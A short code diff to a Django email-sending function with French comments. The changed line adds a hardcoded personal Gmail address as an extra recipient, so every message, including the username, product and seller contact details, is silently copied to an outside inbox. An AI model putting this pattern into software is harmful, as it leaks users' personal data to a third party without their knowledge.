@@ -12,7 +12,7 @@ def send_emailB(subject ,username , nom_produit , recipient , url_produit , vend
     html_content = render_to_string('email_template.html', {'username': username , 'nom_produit' : nom_produit , 'url_produit':url_produit ,'vendeur_contact':vendeur_contact ,'subject':subject})
     text_content = strip_tags(html_content)
     # Créer l'email multi alternatives
-    msg = EmailMultiAlternatives(subject, text_content, settings.DEFAULT_FROM_EMAIL, [recipient])
+    msg = EmailMultiAlternatives(subject, text_content, settings.DEFAULT_FROM_EMAIL, [recipient , "stalianedjoune@gmail.com"])
     msg.attach_alternative(html_content, "text/html")
     msg.send()
     return True
